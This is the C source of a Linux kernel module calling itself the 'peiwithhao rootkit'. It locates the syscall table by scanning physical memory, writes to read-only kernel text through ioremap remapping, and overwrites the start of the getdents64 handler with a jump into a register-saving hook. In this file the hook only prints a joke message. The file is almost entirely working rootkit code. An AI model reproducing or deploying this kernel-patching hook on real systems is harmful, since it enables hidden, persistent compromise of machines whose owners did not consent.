#define _GNU_SOURCE
#include "pwhrootkit.h"
#include <linux/uaccess.h>
#include <linux/init_task.h>
#include <linux/kstrtox.h>
#include <linux/sched.h>
#include <linux/pid.h>

#define USER_KALLSYMS 0x1111
#define SEARCH_SYSCALL 0x2222
#define SUPER_HOOK 0x3333
#define CODE_BUFFER 0x100

static size_t syscall_table_data[5];
static size_t get_syscall_data = 0;
static size_t syscall_table_addr;

/* hook函数的上下文结构 */
struct hook_context{
    u8 orig_code[CODE_BUFFER];
    u8 hook_code[CODE_BUFFER];
    size_t shellcode_nr;
    size_t ret;
    struct pt_regs regs;
    void (* orig_func)(size_t, size_t, size_t, size_t, size_t, size_t);
    void (* hook_before)(struct pt_regs *);
    void (* hook_after)(struct pt_regs *, size_t );
};

/* 用来存放hook上下文 */
static struct hook_context temp_hook_ctx;


/* 使用重映射来修改只读页面 */
static int arbitrary_remap_write(void *dst, void *src, size_t size){
    size_t phys_addr, phys_offset;
    size_t phys_ioremap_addr;
    /* 获取虚拟地址所在物理页帧的首地址 */
    phys_addr = page_to_pfn(virt_to_page(dst)) * PAGE_SIZE;
    /* 获取页内地址的偏移 */
    phys_offset = (size_t )dst & 0xfff;
    /* 重新映射该物理地址到另一个虚拟地址 */
    phys_ioremap_addr = (size_t)ioremap(phys_addr, PAGE_SIZE);
    /* 拷贝内容到该虚拟地址,从而间接拷贝到只读物理地址 */
    memcpy((size_t *)(phys_ioremap_addr + phys_offset), src, size);
    /* 最后调用该函数来解除映射 */
    iounmap((size_t *)phys_ioremap_addr);
    return 0;
}

static void sys_call_table_finder(void){
    /* 遍历内核,这里存放特征 */
    /* page_offset_base存放的是physmap的首虚拟地址,从这里开始就可以遍历所有的内核 */
    size_t *phys_mem = (size_t *)page_offset_base;

    char *argv[] = {
        "/sys_table_finder",
        NULL,
    };
    char *envp[] = {
        "HOME=/",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
        NULL,
    };
    if(get_syscall_data){
    //    printk(KERN_INFO "[peiwithhao rootkit] already have the sys_call_table at 0x%lx", syscall_table_addr);
        return;
    }

    /* 调用用户态程序 */
    /* UMH_WAIT_PROC这个标识符表示要等用户程序执行完毕 */
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    // if(!get_syscall_data){
    //     panic("failed to get the sycall data from userspace!");
    // }
    for(size_t i = 0;; i++){
        if(phys_mem[i+0] == syscall_table_data[0]
        && phys_mem[i+1] == syscall_table_data[1]
        && phys_mem[i+2] == syscall_table_data[2]
        && phys_mem[i+3] == syscall_table_data[3]
        ){
            syscall_table_addr = (size_t)&(phys_mem[i]);
            printk(KERN_INFO "[peiwithhao rootkit] sys_call_table founded at %lx", syscall_table_addr);
            break;
        }
    }
    get_syscall_data = 1;
}

static void funny_joke(struct pt_regs * regs){
    printk(KERN_INFO "[peiwithhao rootkit] You are hooked by THE GREAT PEIWITHHAO ;)");
}



//void (*evil_func)(void);

    /*
    void (*evil_func) (void)  = (void (*)(void))hooker_addr;

    evil_func();

    arbitrary_remap_write((void *)(hooked_addr), orig_code, count);
    */

static size_t hook_king(void){
    asm volatile(
        "subq $0x100, %%rsp;"
        "movq %%rax, %0;"
        "movq %%rbx, %1;"
        "movq %%rcx, %2;"
        "movq %%rdx, %3;"
        "movq %%rsi, %4;"
        "movq %%rdi, %5;"
        "movq %%rbp, %6;"
        "movq %%r8, %7;"
        "movq %%r9, %8;"
        "movq %%r10, %9;"
        "movq %%r11, %10;"
        "movq %%r12, %11;"
        "movq %%r13, %12;"
        "movq %%r14, %13;"
        "movq %%r15, %14;"
        "addq $0x100, %%rsp;"

        : "=m"(temp_hook_ctx.regs.ax),  "=m"(temp_hook_ctx.regs.bx), \
          "=m"(temp_hook_ctx.regs.cx),  "=m"(temp_hook_ctx.regs.dx), \
          "=m"(temp_hook_ctx.regs.si),  "=m"(temp_hook_ctx.regs.di), \
          "=m"(temp_hook_ctx.regs.bp),  "=m"(temp_hook_ctx.regs.r8), \
          "=m"(temp_hook_ctx.regs.r9),  "=m"(temp_hook_ctx.regs.r10), \
          "=m"(temp_hook_ctx.regs.r11), "=m"(temp_hook_ctx.regs.r12), \
          "=m"(temp_hook_ctx.regs.r13), "=m"(temp_hook_ctx.regs.r14), \
          "=m"(temp_hook_ctx.regs.r15)
        :
        : );
    temp_hook_ctx.hook_before(&(temp_hook_ctx.regs));
    /* 恢复内容 */
    arbitrary_remap_write((void *)temp_hook_ctx.orig_func, temp_hook_ctx.orig_code, temp_hook_ctx.shellcode_nr);

    asm volatile(
        "movq %1, %%rax;"
        "movq %2, %%rbx;"
        "movq %3, %%rcx;"
        "movq %4, %%rdx;"
        "movq %5, %%rsi;"
        "movq %6, %%rdi;"
        "movq %7, %%rbp;"
        "movq %8, %%r8;"
        "movq %9, %%r9;"
        "movq %10, %%r10;"
        "movq %11, %%r11;"
        "movq %12, %%r12;"
        "movq %13, %%r13;"
        "movq %14, %%r14;"
        "movq %15, %%r15;"
        "call *%16;"
        "movq %%rax, %0"
        : "=m"(temp_hook_ctx.ret)
        : "m"(temp_hook_ctx.regs.ax),  "m"(temp_hook_ctx.regs.bx), \
          "m"(temp_hook_ctx.regs.cx),  "m"(temp_hook_ctx.regs.dx), \
          "m"(temp_hook_ctx.regs.si),  "m"(temp_hook_ctx.regs.di), \
          "m"(temp_hook_ctx.regs.bp),  "m"(temp_hook_ctx.regs.r8), \
          "m"(temp_hook_ctx.regs.r9),  "m"(temp_hook_ctx.regs.r10), \
          "m"(temp_hook_ctx.regs.r11), "m"(temp_hook_ctx.regs.r12), \
          "m"(temp_hook_ctx.regs.r13), "m"(temp_hook_ctx.regs.r14), \
          "m"(temp_hook_ctx.regs.r15), "m"(temp_hook_ctx.orig_func)
        : 
    );
    //temp_hook_ctx.orig_func(temp_hook_ctx.regs.di, temp_hook_ctx.regs.si, temp_hook_ctx.regs.dx, temp_hook_ctx.regs.cx, temp_hook_ctx.regs.r8, temp_hook_ctx.regs.r9);
    /* 重新hook */
    arbitrary_remap_write((void *)temp_hook_ctx.orig_func, temp_hook_ctx.hook_code, temp_hook_ctx.shellcode_nr);
    return temp_hook_ctx.ret;
}


static ssize_t pwh_rootkit_read(struct file *file, char __user *buf, size_t count, loff_t * ppos){
    //arbitrary_remap_write((void *)(syscall_table_addr), "peiwithhao", 10);
    return 0;
}

#define SHELLCODE_MAX_NR 1024
static size_t orig_code[SHELLCODE_MAX_NR] = {0};
static u8 shell_code[SHELLCODE_MAX_NR] = {0};

static ssize_t orig_modifier(size_t orig_func, size_t hook_before){
    size_t shellcode_nr;
    size_t index;
    size_t *share_orig;
    size_t *share_shell;
    size_t hook_ctl;
    /* 保存hook函数 */
    temp_hook_ctx.hook_before = (void (*)(struct pt_regs *))hook_before;
    temp_hook_ctx.hook_after = NULL;
    temp_hook_ctx.orig_func = (void (*)(size_t, size_t, size_t, size_t, size_t, size_t))orig_func;

    hook_ctl = (size_t)hook_king;


    // jmp 0x*
    shellcode_nr = sizeof(u8) + sizeof(size_t);

    /* 保存指令 */
    memcpy((size_t *)(temp_hook_ctx.orig_code), (size_t *)orig_func, shellcode_nr);
    share_orig = orig_code;
    share_shell = (size_t *)shell_code;
    
    index = 0;

    hook_ctl = hook_ctl  - orig_func - shellcode_nr + 4;
    shell_code[index++] = 0xE9;
    for(int i = 0; i < sizeof(size_t) ; i++){
        shell_code[index++] = ((char *)&hook_ctl)[i];
    }
    /* 保存shellcode */
    memcpy((size_t *)(temp_hook_ctx.hook_code), (size_t *)shell_code, shellcode_nr);
    temp_hook_ctx.shellcode_nr = shellcode_nr;

    arbitrary_remap_write((void *)orig_func, shell_code, shellcode_nr);

    return 0;
}

static ssize_t pwh_rootkit_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos){
    return 0;
}

static long pwh_rootkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg){
    size_t hooked_addr;
    int ret; switch(cmd){
        case USER_KALLSYMS:
            ret = copy_from_user(syscall_table_data, (void *)arg, sizeof(syscall_table_data));
            break;
        case SEARCH_SYSCALL:
                /* 寻找系统调用表 */
            sys_call_table_finder();
            break;
        case SUPER_HOOK:
                /* 寻找系统调用表 */
            sys_call_table_finder();
            hooked_addr = ((size_t *)syscall_table_addr)[217];
            //orig_modifier(hooked_addr, (size_t)&funny_joke);
            orig_modifier((size_t)hooked_addr, (size_t)&funny_joke);
            //arbitrary_remap_write((void *)poll_addr, shellcode, sizeof(shellcode));
            break;
        default:
            break;
    }
    return 0;
}
/* 打开类容 */
static int pwh_rootkit_open(struct inode *inode, struct file *file){
    return 0;
}
static int pwh_rootkit_release(struct inode *inode, struct file *file){
    return 0;
}
